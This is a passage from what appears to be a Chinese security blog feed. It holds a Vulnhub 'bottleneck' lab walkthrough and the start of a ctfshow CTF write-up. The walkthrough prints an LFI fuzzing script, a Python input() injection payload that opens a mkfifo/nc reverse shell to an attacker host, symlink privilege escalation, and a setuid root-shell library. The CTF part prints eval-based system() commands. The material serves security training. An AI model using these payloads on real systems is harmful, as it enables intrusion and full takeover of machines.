class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>    root = createLink()<br>    <span class="hljs-comment"># show(root)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>        delete(x, root)<br>        insert(x, root)<br>        show(root)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-bottleneck</title>
    <link href="/2022/01/30/Vulnhub-bottleneck/"/>
    <url>/2022/01/30/Vulnhub-bottleneck/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01:前言"></a>0x01:前言</h2><p>好久之前做的觉得还不错，今天给它发出来见见光</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02:信息收集"></a>0x02:信息收集</h2><p>判断目标机器Ip为    192.168.1.53</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956986.png" alt="img"></p><p>几个扫描结果</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956264.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956798.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956637.png" alt="img"></p><p>得到的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs plain">/css<br>/index.php<br>/js<br>/image_gallery.php<br>/img<br></code></pre></td></tr></table></figure><p>主页的提示，并没有什么用</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956810.png" alt="img"></p><h2 id="0x02-LFI漏洞利用"><a href="#0x02-LFI漏洞利用" class="headerlink" title="0x02:LFI漏洞利用"></a>0x02:LFI漏洞利用</h2><p>在  &#x2F;image_gallery.php 中</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956347.png" alt="img"></p><p>发现图片存在 t 和 f 这两个参数，猜测可能对应单词 time 和  file ,随后我尝试刷新</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000447.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000678.png" alt="img"></p><p>两个数字还挺像的对吧 …(生硬了</p><p>尝试burp重新发包 读取 &#x2F;root&#x2F;flag.txt   麻了，后来看了看别的老哥walkthrough 好多读&#x2F;etc&#x2F;passwd  记一下记一下</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955883.png" alt="img"></p><p>没有返回内容，emmm，试试脚本弥补手速的缺陷？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://192.168.1.53/image_gallery.php&quot;</span><br>r=requests.get(url=url)<br>res=r.text<br>dtime=datetime.datetime.now()<br>t=<span class="hljs-built_in">int</span>(time.mktime(dtime.timetuple()))<br>filename=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\16476\\Desktop\\fuzz.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> filename.read().splitlines():<br>    word=line.strip(<span class="hljs-string">&quot;\r&quot;</span>).strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>    payload = base64.b64encode(word.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-keyword">try</span>:<br>        params=&#123;<br>            <span class="hljs-string">&#x27;t&#x27;</span>:t,<br>            <span class="hljs-string">&#x27;f&#x27;</span>:payload<br>        &#125;<br>        r1=requests.get(url=url,params=params)<br>        <span class="hljs-built_in">print</span>(r1.request.url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------------start verify-&quot;</span>+word+<span class="hljs-string">&quot;--------------&quot;</span>)<br>        res=r1.text<br>        <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955066.png" alt="img"></p><p>可以发现我们的请求被扔进了垃圾桶 ，这次时间应该是没啥问题 那问题可能出在文件名上？尝试读取..&#x2F;image_gallery.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">CHANGELOG</span><br><span class="hljs-comment">v1.1: Still testing without content.</span><br><span class="hljs-comment">    I&#x27;ve fixed that problem that <span class="hljs-doctag">@p</span>4w and <span class="hljs-doctag">@ska</span> notified me after hacker attack.</span><br><span class="hljs-comment">    Shit I&#x27;m too lazy to make a big review of my code.</span><br><span class="hljs-comment">    I think that the LFI problem can be mitigated with the blacklist.</span><br><span class="hljs-comment">    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">v1.0: Starting this beautiful gallery</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$tstamp</span> = time();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;image_gallery_load.php&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>又发现个文件名 image_gallery_load.php 继续尝试获取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_troll</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$messages</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;messages&#x27;</span>];<br>    <span class="hljs-variable">$troll</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;troll&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$messages</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$troll</span>;<br>&#125;<br><br><span class="hljs-variable">$troll</span> = <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;pre&gt;</span><br><span class="hljs-string">                                   _,..._</span><br><span class="hljs-string">                                  /__    \</span><br><span class="hljs-string">                                   &gt;&lt; `.  \</span><br><span class="hljs-string">                                  /_    \ |</span><br><span class="hljs-string">                                   \-_  /:|</span><br><span class="hljs-string">                                 ,--&#x27;..&#x27;. :</span><br><span class="hljs-string">                               ,&#x27;         `.</span><br><span class="hljs-string">                            _,&#x27;             \</span><br><span class="hljs-string">                   _.._,--&#x27;&#x27;    ,           |</span><br><span class="hljs-string">               , ,&#x27;,, _|    _,.&#x27;|      |    |</span><br><span class="hljs-string">            \\||/,&#x27;(,&#x27; &#x27;--&#x27;&#x27;    |      |    |</span><br><span class="hljs-string">       _     |||                |      /-&#x27;  |</span><br><span class="hljs-string">      | |   (- -)&lt;`._           |     /    /</span><br><span class="hljs-string">      | |  \_\O/_/`-.(&lt;&lt;        |____/    /</span><br><span class="hljs-string">      | |   /   \              / -&#x27;| `--.&#x27;|</span><br><span class="hljs-string">      | |   \___/             /           /</span><br><span class="hljs-string">      | |    H H             /     |     |</span><br><span class="hljs-string">      |_|_..-H-H--.._       /     ,|     |</span><br><span class="hljs-string">        |-.._&quot;_&quot;__..-|     |   _-/ |     |</span><br><span class="hljs-string">        |            |     |    |   \_   |</span><br><span class="hljs-string">        |            |     |    |   |    |</span><br><span class="hljs-string">        |            |     |____|   |    |</span><br><span class="hljs-string">        |            |  _..&#x27;    |   |____|</span><br><span class="hljs-string">        |            |_(____..._&#x27; _.&#x27;    |</span><br><span class="hljs-string">        `-..______..-&#x27;&quot;&quot;         (___..--&#x27;</span><br><span class="hljs-string">&lt;pre&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$imagefile</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br><span class="hljs-variable">$timestamp</span> = time();<br><span class="hljs-variable">$isblocked</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/etc&#x27;</span>,<span class="hljs-string">&#x27;/opt&#x27;</span>,<span class="hljs-string">&#x27;/var&#x27;</span>,<span class="hljs-string">&#x27;/opt&#x27;</span>,<span class="hljs-string">&#x27;/proc&#x27;</span>,<span class="hljs-string">&#x27;/dev&#x27;</span>,<span class="hljs-string">&#x27;/lib&#x27;</span>,<span class="hljs-string">&#x27;/bin&#x27;</span>,<span class="hljs-string">&#x27;/usr&#x27;</span>,<span class="hljs-string">&#x27;/home&#x27;</span>,<span class="hljs-string">&#x27;/ids&#x27;</span>);<br><span class="hljs-variable">$messages</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\nLet me throw away your nice request into the bin.\n&quot;</span>.<br>    <span class="hljs-string">&quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my </span><br><span class="hljs-string">infrastructructure I will take strong legal measures.\n&quot;</span>.<br>    <span class="hljs-string">&quot;Why don&#x27;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;</span>);<br><br><span class="hljs-keyword">if</span>(abs(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>] - <span class="hljs-variable">$timestamp</span>) &gt; <span class="hljs-number">10</span>)&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$elem</span>)&#123;<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$imagefile</span>, <span class="hljs-variable">$elem</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-variable">$isblocked</span> = <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-comment">// report the intrusion to the soc and save information locally for further investigation</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isblocked</span>)&#123;<br>    <span class="hljs-variable">$logfile</span> = <span class="hljs-string">&#x27;intrusion_&#x27;</span>.<span class="hljs-variable">$timestamp</span>;<br>    <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&#x27;/var/log/soc/&#x27;</span>.<span class="hljs-variable">$logfile</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$imagefile</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    fclose(<span class="hljs-variable">$fp</span>);<br>    exec(<span class="hljs-string">&#x27;python /opt/ids_strong_bvb.py &lt;/var/log/soc/&#x27;</span>.<span class="hljs-variable">$logfile</span>.<span class="hljs-string">&#x27; &gt;/tmp/output 2&gt;&amp;1&#x27;</span>);<br>    print_troll();<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br>chdir(<span class="hljs-string">&#x27;img&#x27;</span>);                                                                                                                                                <br><span class="hljs-variable">$filecontent</span> = file_get_contents(<span class="hljs-variable">$imagefile</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$filecontent</span> === <span class="hljs-literal">FALSE</span>)&#123;<br>    print_troll();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$filecontent</span>;<br>&#125;<br>chdir(<span class="hljs-string">&#x27;../&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到上面的源码 对读取的文件名，和时间只差做了防护,同时我们也可以知道当有黑名单内容时，相关内容会被输出到日志内</p><h2 id="0x03-python2-input-漏洞利用"><a href="#0x03-python2-input-漏洞利用" class="headerlink" title="0x03:python2 input()漏洞利用"></a>0x03:python2 input()漏洞利用</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12605103/1617985123301-6eb1c53c-5b60-41db-b275-f1935ce47949.png" alt="img">知识盲区了</p><p>链接：<a href="https://blog.51cto.com/u_12332766/2299894">https://blog.51cto.com/u_12332766/2299894</a></p><p><a href="https://www.cnblogs.com/heycomputer/articles/10537633.html">https://www.cnblogs.com/heycomputer/articles/10537633.html</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955846.png" alt="img"></p><p>raw_input()比input()更安全的原因是raw_input(完全默认为str字符串类型而input()此函数会将stdin输入的内容当做python代码去执行,类似eval()</p><p>构建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> urllib<br><br>url=<span class="hljs-string">&quot;http://192.168.1.53/image_gallery.php&quot;</span><br>t=time.time()<br>payload=<span class="hljs-string">&#x27;&#x27;&#x27;/etc&#x27; and __import__(&quot;os&quot;).system(&quot;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.114.128 2333 &gt;/tmp/f&quot;) and\&#x27;&#x27;&#x27;&#x27;</span><br>payload1=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>params=&#123;<br>    <span class="hljs-string">&#x27;t&#x27;</span>:t,<br>    <span class="hljs-string">&#x27;f&#x27;</span>:payload1<br>&#125;<br>res=requests.get(url=url,params=params)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p>同时本机监听 4444 端口</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956277.png" alt="img"></p><h2 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04:权限提升"></a>0x04:权限提升</h2><p>检查一下sudo的配置情况</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956898.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956051.png" alt="img"></p><p>发现 clear_logs 指向了&#x2F;opt&#x2F;下的同名脚本，而www-data这个用户对clear_logs有完全控制的权限。但是要想以root权限运行还得切换到bytevsbyte这个用户下</p><p>所以现在大概的思路就是 切换到bytevsbyte用户 并修改clear_logs的指向，指向我们自己的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd /tmp/<br>echo &quot;/bin/bash&quot; &gt; test.sh<br>chmod 777 test.sh<br> ln -snf /tmp/test.sh /var/www/html/web_utils/clear_logs #-s 软链接 (符号链接) -n 把符号链接视为一般目录 -f 强制执行<br></code></pre></td></tr></table></figure><p>这个时候访问 bytevsbytes的家目录就可以看到flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956597.png" alt="img"></p><p>这个靶机还有一个flag 需要提权为root…</p><p>重新检查suid</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956956.png" alt="img"></p><p>发现这里有个testlib </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301001384.png" alt="img"></p><p>查看testlib.c </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span>        <span class="hljs-comment">//调用动态链接库的头文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span>     <span class="hljs-comment">//unistd.h为Linux/Unix系统中内置头文件</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>&#123;<br>    <span class="hljs-keyword">void</span> *handle;<br>    <span class="hljs-keyword">int</span> (*function)();    <br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    handle = dlopen(argv[<span class="hljs-number">1</span>], RTLD_LAZY);   <span class="hljs-comment">//RTLD_LAZY:在dlopen返回前，对于动态库中存在的未定义的变量(如外部变量extern，也可以是函数)不执行解析，就是不解析这个变量的地址</span><br>    function = dlsym(handle, <span class="hljs-string">&quot;test_this&quot;</span>);  <span class="hljs-comment">//dlsym功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址</span><br>    function();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;  <br><span class="hljs-comment">//dlopen，打开一个库，并为使用该库做些准备.dlsym，在打开的库中查找符号的值   所以上面这个大概就是调用动态链接库的事情？</span><br></code></pre></td></tr></table></figure><p>set-root-shell:<a href="https://github.com/jivoi/pentest/blob/master/shell/rootshell.c">https://github.com/jivoi/pentest/blob/master/shell/rootshell.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test_this</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>setuid(<span class="hljs-number">0</span>); setgid(<span class="hljs-number">0</span>); system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-comment">//payload.c</span><br></code></pre></td></tr></table></figure><p>这里因为靶机上没有gcc，所以在攻击机上编译好然后http服务一开传过去就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gcc -fPIC -shared payload.c -o payload.so<br></code></pre></td></tr></table></figure><p>下图第一步就等于调用我们传过的函数库，都没注意 下次直接bash</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956237.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow _新春欢乐赛 热身题的发散思维</title>
    <link href="/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/"/>
    <url>/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow-新春欢乐赛-热身题的发散思维"><a href="#ctfshow-新春欢乐赛-热身题的发散思维" class="headerlink" title="ctfshow _新春欢乐赛 热身题的发散思维"></a>ctfshow _新春欢乐赛 热身题的发散思维</h1><p>打开环境，源码一目了然</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2022-01-16 15:42:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里有个h1xa的小设计，可以看到代码里没有 highlight_file，源码为什么会自己高亮显示？原因很简单因为有auto_append这类预加载文件</p><p>本文尝试用多个解法</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>因为预加载文件会把那个文件的里定义的变量加载到当前文件的变量表里，所以可以有</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291201525.png" alt="image-20220129120114450"></p><h3 id="x2F-proc-x2F-文件目录获取flag"><a href="#x2F-proc-x2F-文件目录获取flag" class="headerlink" title="&#x2F;proc&#x2F;文件目录获取flag"></a>&#x2F;proc&#x2F;文件目录获取flag</h3><p><code>?f=system(&quot;ls /proc/&quot;);</code> 查看正在运行的进程</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291210025.png" alt="image-20220129121033949"></p><p>好吧经过实践这个思路不行,这里 &#x2F;proc&#x2F; 目录下内容所属用户和组都是root,而提供服务的是www-data，自己写的小脚本先贴在这儿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">7</span>,<span class="hljs-number">76</span>]:<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>        url=<span class="hljs-string">&quot;http://0f8360bf-70b5-485e-a69a-0889ce967e3c.challenge.ctf.show/?f=system(&#x27;nl /proc/%d/fd/%d&#x27;);&quot;</span> %(i,j)<br>        <br>        url=url.<span class="hljs-built_in">format</span>(i,j)<br>        r=requests.get(url=url,)<br>        sleep(<span class="hljs-number">0.5</span>)<br>        result=r.text+url+<span class="hljs-string">&#x27;\n&#x27;</span><br>        output=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>        output.write(result)<br>        <span class="hljs-built_in">print</span>(r)<br>        output.close()<br><br></code></pre></td></tr></table></figure><h2 id="写马"><a href="#写马" 